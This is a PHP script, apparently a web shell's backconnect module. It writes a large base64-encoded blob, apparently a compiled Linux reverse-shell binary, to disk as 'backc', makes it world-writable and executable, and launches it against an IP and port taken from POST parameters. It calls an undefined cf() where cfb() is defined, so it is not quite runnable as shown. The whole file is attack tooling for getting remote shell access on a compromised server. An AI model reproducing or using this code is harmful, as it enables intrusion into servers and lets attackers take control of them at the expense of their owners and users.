<?php

function cfb($fname,$text) {
  $w_file=@fopen($fname,"w") or bberr();
  @fputs($w_file,@base64_decode($text));
  @fclose($w_file);
}

function ex($cf3) {
    @ob_start();
    @system($cf3);
    $res = @ob_get_contents();
    @ob_end_clean();
    return $res;
}

$bc_c = "ZjBWTVJnRUJBUUFBQUFBQUFBQUFBQUlBQXdBQkFBQUEySVVFQ0RRQUFBQk1EQUFBQUFBQUFEUUFJQUFIQUNnQUhBQVpBQVlBQUFBMEFBQUFOSUFFQ0RTQUJBamdBQUFBNEFBQUFBVUFBQUFFQUFBQUF3QUFBQlFCQUFBVWdRUUlGSUVFQ0JNQUFBQVRBQUFBQkFBQUFBRUFBQUFCQUFBQUFBQUFBQUNBQkFnQWdBUUlMQWtBQUN3SkFBQUZBQUFBQUJBQUFBRUFBQUFzQ1FBQUxKa0VDQ3laQkFnNEFRQUFQQUVBQUFZQUFBQUFFQUFBQWdBQUFFQUpBQUJBbVFRSVFKa0VDTWdBQUFESUFBQUFCZ0FBQUFRQUFBQUVBQUFBS0FFQUFDaUJCQWdvZ1FRSUlBQUFBQ0FBQUFBRUFBQUFCQUFBQUZIbGRHUUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQVlBQUFBRUFBQUFMMnhwWWk5c1pDMXNhVzUxZUM1emJ5NHlBQUFFQUFBQUVBQUFBQUVBQUFCSFRsVUFBQUFBQUFJQUFBQUNBQUFBQlFBQUFCRUFBQUFVQUFBQUFBQUFBQUFBQUFBUkFBQUFFZ0FBQUFjQUFBQUtBQUFBQ3dBQUFBZ0FBQUFQQUFBQUF3QUFBQUFBQUFBQUFBQUFBQUFBQUJBQUFBQUFBQUFBRXdBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUZBQUFBQmdBQUFBQUFBQUFCQUFBQUFBQUFBQWtBQUFBQUFBQUFEQUFBQUFBQUFBQUFBQUFBRFFBQUFBNEFBQUFDQUFBQUJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQTJBQUFBQUFBQUFCd0JBQUFTQUFBQXJBQUFBQUFBQUFCeEFBQUFFZ0FBQUR3QUFBQUFBQUFBQ3dJQUFCSUFBQUJJQUFBQUFBQUFBSDBBQUFBU0FBQUFqQUFBQUFBQUFBQ3NBUUFBRWdBQUFLVUFBQUFBQUFBQXJ3QUFBQklBQUFCakFBQUFBQUFBQUNjQUFBQVNBQUFBa3dBQUFBQUFBQURkQUFBQUVnQUFBRU1BQUFBQUFBQUFPZ0FBQUJJQUFBQmNBQUFBQUFBQUFLb0JBQUFTQUFBQVZnQUFBQUFBQUFBMkFBQUFFZ0FBQUhNQUFBQUFBQUFBMlFBQUFCSUFBQUI0QUFBQUFBQUFBQ2dBQUFBU0FBQUFiUUFBQUFBQUFBQU9BQUFBRWdBQUFDNEFBQUFBQUFBQWVBQUFBQklBQUFCOUFBQUE4SWdFQ0FRQUFBQVJBQTRBVHdBQUFBQUFBQUE1QUFBQUVnQUFBQUVBQUFBQUFBQUFBQUFBQUNBQUFBQVZBQUFBQUFBQUFBQUFBQUFnQUFBQUFGOUtkbDlTWldkcGMzUmxja05zWVhOelpYTUFYMTluYlc5dVgzTjBZWEowWDE4QWJHbGlZeTV6Ynk0MkFHTnZibTVsWTNRQVpYaGxZMndBY0dWeWNtOXlBR1IxY0RJQWMzbHpkR1Z0QUhOdlkydGxkQUJpZW1WeWJ3QnpkSEpqWVhRQWFXNWxkRjloWkdSeUFHaDBiMjV6QUdWNGFYUUFZWFJ2YVFCZlNVOWZjM1JrYVc1ZmRYTmxaQUJrWVdWdGIyNEFYMTlzYVdKalgzTjBZWEowWDIxaGFXNEFjM1J5YkdWdUFHTnNiM05sQUVkTVNVSkRYekl1TUFBQUFBSUFBZ0FDQUFJQUFnQUNBQUlBQWdBQ0FBSUFBZ0FDQUFJQUFnQUNBQUVBQWdBQUFBQUFBUUFCQUNRQUFBQVFBQUFBQUFBQUFCQnBhUTBBQUFJQXNnQUFBQUFBQUFBSW1nUUlCaE1BQUJpYUJBZ0hBUUFBSEpvRUNBY0NBQUFnbWdRSUJ3TUFBQ1NhQkFnSEJBQUFLSm9FQ0FjRkFBQXNtZ1FJQndZQUFEQ2FCQWdIQndBQU5Kb0VDQWNJQUFBNG1nUUlCd2tBQUR5YUJBZ0hDZ0FBUUpvRUNBY0xBQUJFbWdRSUJ3d0FBRWlhQkFnSERRQUFUSm9FQ0FjT0FBQlFtZ1FJQnc4QUFGU2FCQWdIRVFBQVZZbmxnK3dJNkVFQkFBRG9sQUVBQU9qbkF3QUF5Y01BL3pVUW1nUUkveVVVbWdRSUFBQUFBUDhsR0pvRUNHZ0FBQUFBNmVELy8vLy9KUnlhQkFob0NBQUFBT25RLy8vLy95VWdtZ1FJYUJBQUFBRHB3UC8vLy84bEpKb0VDR2dZQUFBQTZiRC8vLy8vSlNpYUJBaG9JQUFBQU9tZy8vLy8veVVzbWdRSWFDZ0FBQURwa1AvLy8vOGxNSm9FQ0dnd0FBQUE2WUQvLy8vL0pUU2FCQWhvT0FBQUFPbHcvLy8vL3lVNG1nUUlhRUFBQUFEcFlQLy8vLzhsUEpvRUNHaElBQUFBNlZELy8vLy9KVUNhQkFob1VBQUFBT2xBLy8vLy95VkVtZ1FJYUZnQUFBRHBNUC8vLy84bFNKb0VDR2hnQUFBQTZTRC8vLy8vSlV5YUJBaG9hQUFBQU9rUS8vLy8veVZRbWdRSWFIQUFBQURwQVAvLy8vOGxWSm9FQ0doNEFBQUE2ZkQrLy84eDdWNko0WVBrOEZCVVVtaG9pQVFJYUJTSUJBaFJWbWlBaGdRSTZFLy8vLy8wa0pCVmllVlQ2QUFBQUFCYmdjTUhGQUFBVW91RC9QLy8vNFhBZEFMLzBGaGJ5Y09Ra0pCVmllV0Q3QWlBUFdTYUJBZ0FkQS9ySDQxMkFJUEFCS05nbWdRSS85S2hZSm9FQ0lzUWhkSjE2OFlGWkpvRUNBSEp3NG4yVllubGcrd0lvVHlaQkFpRndIUVp1QUFBQUFDRndIUVFnK3dNYUR5WkJBai8wSVBFRUkxMkFNbkRrSkJWaWVWWFZsT0Q3RXlENVBDNEFBQUFBSVBBRDRQQUQ4SG9CTUhnQkNuRWpYMm92dlNJQkFqOHVRY0FBQUR6cEkxOXIveTVEZ0FBQUxBQTg2cUQ3QWhxQUdvQjZGRCsvLytEeEJCbXgwWElBZ0NEN0F5TFJReUR3QWovTU9pMy92Ly9nOFFRRDdmQWcrd01VT2k0L3YvL2c4UVFab2xGeW9Qc0RJdEZESVBBQlA4dzZESCsvLytEeEJDSlJjeUQ3QWlMUlF5RHdBU0Q3QVQvTU9nSS92Ly9nOFFJaWNPTFJReUR3QWlEN0FUL01PanovZi8vZzhRSWpRUURRRkNMUlF5RHdBVC9NT2d1L3YvL2c4UVFnK3dFYWdacUFXb0M2RzMrLy8rRHhCQ0pSZVNEN0FScUVJMUZ5RkQvZGVUb1J2Ny8vNFBFRUlYQWVScUQ3QXhvQ1lrRUNPaHkvZi8vZzhRUWcrd01hZ0RvOWYzLy80UHNDSXRGRFA4d2pVV29VT2pFL2YvL2c4UVFnK3dNalVXb1VPaFYvZi8vZzhRUWcrd0lhZ0QvZGVUb2xmMy8vNFBFRUlQc0NHb0IvM1hrNklYOS8vK0R4QkNEN0FocUF2OTE1T2gxL2YvL2c4UVFnK3dFYWdCb0Y0a0VDR2dkaVFRSTZONzgvLytEeEJDRDdBei9kZVRvNFB6Ly80UEVFSTFsOUZ0ZVg4bkRrRldKNVZkV1U0UHNET2dBQUFBQVc0SEQ2aEVBQU9pQy9QLy9qWU1nLy8vL2paTWcvLy8vaVVYd0tkQXg5c0g0QWpuR2N4YUoxNG4yL3hTeWkwM3dLZmxHd2ZrQ09jNkorbkx1ZzhRTVcxNWZ5Y09KOWxXSjVWZFdVK2dBQUFBQVc0SERtUkVBQUkyRElQLy8vNDI3SVAvLy95bjR3ZmdDZyt3TWpYRC82d1dRL3hTM1RvUCsvM1gzNkM0QUFBQ0R4QXhiWGwvSnc1Q1FWWW5sVTFLN0xKa0VDS0VzbVFRSTZ3cU5kZ0NENndULzBJc0RnL2ovZGZSWVc4bkRWWW5sVStnQUFBQUFXNEhETXhFQUFGRG9PdjMvLzFsYnljTUFBQU1BQUFBQkFBSUFjbTBnTFdZZ0FBQUFBQUFBQUFBQUFBQUFBQUFBV3kxZElHTnZibTVsWTNRb0tRQnphQ0F0YVFBdlltbHVMM05vQUFBQUFBQUFBQUQvLy8vL0FBQUFBUC8vLy84QUFBQUFBQUFBQUFFQUFBQWtBQUFBREFBQUFMQ0VCQWdOQUFBQTBJZ0VDQVFBQUFCSWdRUUlCUUFBQUNTREJBZ0dBQUFBNUlFRUNBb0FBQUM4QUFBQUN3QUFBQkFBQUFBVkFBQUFBQUFBQUFNQUFBQU1tZ1FJQWdBQUFJQUFBQUFVQUFBQUVRQUFBQmNBQUFBd2hBUUlFUUFBQUNpRUJBZ1NBQUFBQ0FBQUFCTUFBQUFJQUFBQS92Ly9id2lFQkFqLy8vOXZBUUFBQVBELy8yL2dnd1FJQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBRUNaQkFnQUFBQUFBQUFBQU42RUJBanVoQVFJL29RRUNBNkZCQWdlaFFRSUxvVUVDRDZGQkFoT2hRUUlYb1VFQ0c2RkJBaCtoUVFJam9VRUNKNkZCQWl1aFFRSXZvVUVDTTZGQkFnQUFBQUFBQUFBQURpWkJBZ0FSME5ET2lBb1IwNVZLU0F6TGpRdU5TQXlNREExTVRJd01TQW9VbVZrSUVoaGRDQXpMalF1TlMweUtRQUFSME5ET2lBb1IwNVZLU0F6TGpRdU5TQXlNREExTVRJd01TQW9VbVZrSUVoaGRDQXpMalF1TlMweUtRQUFSME5ET2lBb1IwNVZLU0F6TGpRdU5TQXlNREExTVRJd01TQW9VbVZrSUVoaGRDQXpMalF1TlMweUtRQUFSME5ET2lBb1IwNVZLU0F6TGpRdU5TQXlNREExTVRJd01TQW9VbVZrSUVoaGRDQXpMalF1TlMweUtRQUFSME5ET2lBb1IwNVZLU0F6TGpRdU5TQXlNREExTVRJd01TQW9VbVZrSUVoaGRDQXpMalF1TlMweUtRQUFSME5ET2lBb1IwNVZLU0F6TGpRdU5TQXlNREExTVRJd01TQW9VbVZrSUVoaGRDQXpMalF1TlMweUtRQUFMbk41YlhSaFlnQXVjM1J5ZEdGaUFDNXphSE4wY25SaFlnQXVhVzUwWlhKd0FDNXViM1JsTGtGQ1NTMTBZV2NBTG1oaGMyZ0FMbVI1Ym5ONWJRQXVaSGx1YzNSeUFDNW5iblV1ZG1WeWMybHZiZ0F1WjI1MUxuWmxjbk5wYjI1ZmNnQXVjbVZzTG1SNWJnQXVjbVZzTG5Cc2RBQXVhVzVwZEFBdWRHVjRkQUF1Wm1sdWFRQXVjbTlrWVhSaEFDNWxhRjltY21GdFpRQXVZM1J2Y25NQUxtUjBiM0p6QUM1cVkzSUFMbVI1Ym1GdGFXTUFMbWR2ZEFBdVoyOTBMbkJzZEFBdVpHRjBZUUF1WW5OekFDNWpiMjF0Wlc1MEFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBYkFBQUFBUUFBQUFJQUFBQVVnUVFJRkFFQUFCTUFBQUFBQUFBQUFBQUFBQUVBQUFBQUFBQUFJd0FBQUFjQUFBQUNBQUFBS0lFRUNDZ0JBQUFnQUFBQUFBQUFBQUFBQUFBRUFBQUFBQUFBQURFQUFBQUZBQUFBQWdBQUFFaUJCQWhJQVFBQW5BQUFBQVFBQUFBQUFBQUFCQUFBQUFRQUFBQTNBQUFBQ3dBQUFBSUFBQURrZ1FRSTVBRUFBRUFCQUFBRkFBQUFBUUFBQUFRQUFBQVFBQUFBUHdBQUFBTUFBQUFDQUFBQUpJTUVDQ1FEQUFDOEFBQUFBQUFBQUFBQUFBQUJBQUFBQUFBQUFFY0FBQUQvLy85dkFnQUFBT0NEQkFqZ0F3QUFLQUFBQUFRQUFBQUFBQUFBQWdBQUFBSUFBQUJVQUFBQS92Ly9id0lBQUFBSWhBUUlDQVFBQUNBQUFBQUZBQUFBQVFBQUFBUUFBQUFBQUFBQVl3QUFBQWtBQUFBQ0FBQUFLSVFFQ0NnRUFBQUlBQUFBQkFBQUFBQUFBQUFFQUFBQUNBQUFBR3dBQUFBSkFBQUFBZ0FBQURDRUJBZ3dCQUFBZ0FBQUFBUUFBQUFMQUFBQUJBQUFBQWdBQUFCMUFBQUFBUUFBQUFZQUFBQ3doQVFJc0FRQUFCY0FBQUFBQUFBQUFBQUFBQVFBQUFBQUFBQUFjQUFBQUFFQUFBQUdBQUFBeUlRRUNNZ0VBQUFRQVFBQUFBQUFBQUFBQUFBRUFBQUFCQUFBQUhzQUFBQUJBQUFBQmdBQUFOaUZCQWpZQlFBQStBSUFBQUFBQUFBQUFBQUFCQUFBQUFBQUFBQ0JBQUFBQVFBQUFBWUFBQURRaUFRSTBBZ0FBQm9BQUFBQUFBQUFBQUFBQUFRQUFBQUFBQUFBaHdBQUFBRUFBQUFDQUFBQTdJZ0VDT3dJQUFBNUFBQUFBQUFBQUFBQUFBQUVBQUFBQUFBQUFJOEFBQUFCQUFBQUFnQUFBQ2lKQkFnb0NRQUFCQUFBQUFBQUFBQUFBQUFBQkFBQUFBQUFBQUNaQUFBQUFRQUFBQU1BQUFBc21RUUlMQWtBQUFnQUFBQUFBQUFBQUFBQUFBUUFBQUFBQUFBQW9BQUFBQUVBQUFBREFBQUFOSmtFQ0RRSkFBQUlBQUFBQUFBQUFBQUFBQUFFQUFBQUFBQUFBS2NBQUFBQkFBQUFBd0FBQUR5WkJBZzhDUUFBQkFBQUFBQUFBQUFBQUFBQUJBQUFBQUFBQUFDc0FBQUFCZ0FBQUFNQUFBQkFtUVFJUUFrQUFNZ0FBQUFGQUFBQUFBQUFBQVFBQUFBSUFBQUF0UUFBQUFFQUFBQURBQUFBQ0pvRUNBZ0tBQUFFQUFBQUFBQUFBQUFBQUFBRUFBQUFCQUFBQUxvQUFBQUJBQUFBQXdBQUFBeWFCQWdNQ2dBQVRBQUFBQUFBQUFBQUFBQUFCQUFBQUFRQUFBRERBQUFBQVFBQUFBTUFBQUJZbWdRSVdBb0FBQXdBQUFBQUFBQUFBQUFBQUFRQUFBQUFBQUFBeVFBQUFBZ0FBQUFEQUFBQVpKb0VDR1FLQUFBRUFBQUFBQUFBQUFBQUFBQUVBQUFBQUFBQUFNNEFBQUFCQUFBQUFBQUFBQUFBQUFCa0NnQUFEZ0VBQUFBQUFBQUFBQUFBQVFBQUFBQUFBQUFSQUFBQUF3QUFBQUFBQUFBQUFBQUFjZ3NBQU5jQUFBQUFBQUFBQUFBQUFBRUFBQUFBQUFBQUFRQUFBQUlBQUFBQUFBQUFBQUFBQUt3UUFBQkFCUUFBR3dBQUFDd0FBQUFFQUFBQUVBQUFBQWtBQUFBREFBQUFBQUFBQUFBQUFBRHNGUUFBTEFNQUFBQUFBQUFBQUFBQUFRQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFCU0JCQWdBQUFBQUF3QUJBQUFBQUFBb2dRUUlBQUFBQUFNQUFnQUFBQUFBU0lFRUNBQUFBQUFEQUFNQUFBQUFBT1NCQkFnQUFBQUFBd0FFQUFBQUFBQWtnd1FJQUFBQUFBTUFCUUFBQUFBQTRJTUVDQUFBQUFBREFBWUFBQUFBQUFpRUJBZ0FBQUFBQXdBSEFBQUFBQUFvaEFRSUFBQUFBQU1BQ0FBQUFBQUFNSVFFQ0FBQUFBQURBQWtBQUFBQUFMQ0VCQWdBQUFBQUF3QUtBQUFBQUFESWhBUUlBQUFBQUFNQUN3QUFBQUFBMklVRUNBQUFBQUFEQUF3QUFBQUFBTkNJQkFnQUFBQUFBd0FOQUFBQUFBRHNpQVFJQUFBQUFBTUFEZ0FBQUFBQUtJa0VDQUFBQUFBREFBOEFBQUFBQUN5WkJBZ0FBQUFBQXdBUUFBQUFBQUEwbVFRSUFBQUFBQU1BRVFBQUFBQUFQSmtFQ0FBQUFBQURBQklBQUFBQUFFQ1pCQWdBQUFBQUF3QVRBQUFBQUFBSW1nUUlBQUFBQUFNQUZBQUFBQUFBREpvRUNBQUFBQUFEQUJVQUFBQUFBRmlhQkFnQUFBQUFBd0FXQUFBQUFBQmttZ1FJQUFBQUFBTUFGd0FBQUFBQUFBQUFBQUFBQUFBREFCZ0FBQUFBQUFBQUFBQUFBQUFBQXdBWkFBQUFBQUFBQUFBQUFBQUFBQU1BR2dBQUFBQUFBQUFBQUFBQUFBQURBQnNBQVFBQUFQeUZCQWdBQUFBQUFnQU1BQkVBQUFBQUFBQUFBQUFBQUFRQThmOGNBQUFBTEprRUNBQUFBQUFCQUJBQUtnQUFBRFNaQkFnQUFBQUFBUUFSQURnQUFBQThtUVFJQUFBQUFBRUFFZ0JGQUFBQVlKb0VDQUFBQUFBQkFCWUFTUUFBQUdTYUJBZ0JBQUFBQVFBWEFGVUFBQUFnaGdRSUFBQUFBQUlBREFCckFBQUFWSVlFQ0FBQUFBQUNBQXdBRVFBQUFBQUFBQUFBQUFBQUJBRHgvM2NBQUFBd21RUUlBQUFBQUFFQUVBQ0VBQUFBT0prRUNBQUFBQUFCQUJFQWtRQUFBQ2lKQkFnQUFBQUFBUUFQQUo4QUFBQThtUVFJQUFBQUFBRUFFZ0NyQUFBQXJJZ0VDQUFBQUFBQ0FBd0F3UUFBQUFBQUFBQUFBQUFBQkFEeC84Z0FBQUFBQUFBQUhBRUFBQklBQUFEWkFBQUFRSmtFQ0FBQUFBQVJBQk1BNGdBQUFBQUFBQUJ4QUFBQUVnQUFBUE1BQUFEc2lBUUlCQUFBQUJFQURnRDZBQUFBQUFBQUFBc0NBQUFTQUFBQURBRUFBQ3laQkFnQUFBQUFFQUx4L3gwQkFBQmNtZ1FJQUFBQUFCRUNGZ0FxQVFBQWFJZ0VDRUlBQUFBU0FBd0FPZ0VBQUFBQUFBQjlBQUFBRWdBQUFFd0JBQUN3aEFRSUFBQUFBQklBQ2dCU0FRQUFBQUFBQUt3QkFBQVNBQUFBWkFFQUFOaUZCQWdBQUFBQUVnQU1BR3NCQUFBQUFBQUFyd0FBQUJJQUFBQjlBUUFBTEprRUNBQUFBQUFRQXZIL2tBRUFBQlNJQkFoU0FBQUFFZ0FNQUtBQkFBQUFBQUFBSndBQUFCSUFBQUMxQVFBQVpKb0VDQUFBQUFBUUFQSC93UUVBQUlDR0JBaVRBUUFBRWdBTUFNWUJBQUFBQUFBQTNRQUFBQklBQUFEakFRQUFMSmtFQ0FBQUFBQVFBdkgvOUFFQUFBQUFBQUE2QUFBQUVnQUFBQVFDQUFBQUFBQUFxZ0VBQUJJQUFBQVdBZ0FBV0pvRUNBQUFBQUFnQUJZQUlRSUFBTkNJQkFnQUFBQUFFZ0FOQUNjQ0FBQXNtUVFJQUFBQUFCQUM4Zjg3QWdBQUFBQUFBRFlBQUFBU0FBQUFUQUlBQUFBQUFBRFpBQUFBRWdBQUFGd0NBQUFBQUFBQUtBQUFBQklBQUFCc0FnQUFaSm9FQ0FBQUFBQVFBUEgvY3dJQUFBeWFCQWdBQUFBQUVRQVZBSWtDQUFCb21nUUlBQUFBQUJBQThmK09BZ0FBQUFBQUFBNEFBQUFTQUFBQW53SUFBQUFBQUFCNEFBQUFFZ0FBQUxJQ0FBQXNtUVFJQUFBQUFCQUM4Zi9GQWdBQThJZ0VDQVFBQUFBUkFBNEExQUlBQUZpYUJBZ0FBQUFBRUFBV0FPRUNBQUFBQUFBQU9RQUFBQklBQUFEekFnQUFBQUFBQUFBQUFBQWdBQUFBQndNQUFDeVpCQWdBQUFBQUVBTHgveDBEQUFBQUFBQUFBQUFBQUNBQUFBQUFZMkZzYkY5bmJXOXVYM04wWVhKMEFHTnlkSE4wZFdabUxtTUFYMTlEVkU5U1gweEpVMVJmWHdCZlgwUlVUMUpmVEVsVFZGOWZBRjlmU2tOU1gweEpVMVJmWHdCd0xqQUFZMjl0Y0d4bGRHVmtMakVBWDE5a2IxOW5iRzlpWVd4ZlpIUnZjbk5mWVhWNEFHWnlZVzFsWDJSMWJXMTVBRjlmUTFSUFVsOUZUa1JmWHdCZlgwUlVUMUpmUlU1RVgxOEFYMTlHVWtGTlJWOUZUa1JmWHdCZlgwcERVbDlGVGtSZlh3QmZYMlJ2WDJkc2IySmhiRjlqZEc5eWMxOWhkWGdBWW1GamF5NWpBR1Y0WldOc1FFQkhURWxDUTE4eUxqQUFYMFJaVGtGTlNVTUFZMnh2YzJWQVFFZE1TVUpEWHpJdU1BQmZabkJmYUhjQWNHVnljbTl5UUVCSFRFbENRMTh5TGpBQVgxOW1hVzVwWDJGeWNtRjVYMlZ1WkFCZlgyUnpiMTlvWVc1a2JHVUFYMTlzYVdKalgyTnpkVjltYVc1cEFITjVjM1JsYlVCQVIweEpRa05mTWk0d0FGOXBibWwwQUdSaFpXMXZia0JBUjB4SlFrTmZNaTR3QUY5emRHRnlkQUJ6ZEhKc1pXNUFRRWRNU1VKRFh6SXVNQUJmWDJacGJtbGZZWEp5WVhsZmMzUmhjblFBWDE5c2FXSmpYMk56ZFY5cGJtbDBBR2x1WlhSZllXUmtja0JBUjB4SlFrTmZNaTR3QUY5ZlluTnpYM04wWVhKMEFHMWhhVzRBWDE5c2FXSmpYM04wWVhKMFgyMWhhVzVBUUVkTVNVSkRYekl1TUFCZlgybHVhWFJmWVhKeVlYbGZaVzVrQUdSMWNESkFRRWRNU1VKRFh6SXVNQUJ6ZEhKallYUkFRRWRNU1VKRFh6SXVNQUJrWVhSaFgzTjBZWEowQUY5bWFXNXBBRjlmY0hKbGFXNXBkRjloY25KaGVWOWxibVFBWW5wbGNtOUFRRWRNU1VKRFh6SXVNQUJsZUdsMFFFQkhURWxDUTE4eUxqQUFZWFJ2YVVCQVIweEpRa05mTWk0d0FGOWxaR0YwWVFCZlIweFBRa0ZNWDA5R1JsTkZWRjlVUVVKTVJWOEFYMlZ1WkFCb2RHOXVjMEJBUjB4SlFrTmZNaTR3QUdOdmJtNWxZM1JBUUVkTVNVSkRYekl1TUFCZlgybHVhWFJmWVhKeVlYbGZjM1JoY25RQVgwbFBYM04wWkdsdVgzVnpaV1FBWDE5a1lYUmhYM04wWVhKMEFITnZZMnRsZEVCQVIweEpRa05mTWk0d0FGOUtkbDlTWldkcGMzUmxja05zWVhOelpYTUFYMTl3Y21WcGJtbDBYMkZ5Y21GNVgzTjBZWEowQUY5ZloyMXZibDl6ZEdGeWRGOWZBQT09";


cf("backc",$bc_c);
ex("chmod 777 backc");
ex("./backc ".$_POST['backconnectip']." ".$_POST['backconnectport']." &");
?>